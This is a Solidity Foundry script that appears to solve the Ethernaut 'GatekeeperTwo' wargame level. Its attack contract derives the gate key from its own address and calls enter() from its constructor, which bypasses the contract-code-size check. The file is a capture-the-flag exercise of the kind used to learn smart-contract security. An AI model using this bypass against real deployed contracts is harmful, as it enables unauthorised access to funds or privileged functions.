// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract GateKeeperTwoAttack {
    GatekeeperTwo gatekeeper = GatekeeperTwo(0xA4D41fF4AB0F5Ffe164b64155Eba81c5222d50F5);

    constructor() {
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(myKey);
    }
}

contract GateKeeperTwoSolution is Script {

    function run() external {
        // 1 send from contract
        // 2 Specify gas
        // 3 cast msg.sender
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GateKeeperTwoAttack();
        vm.stopBroadcast();
    }
}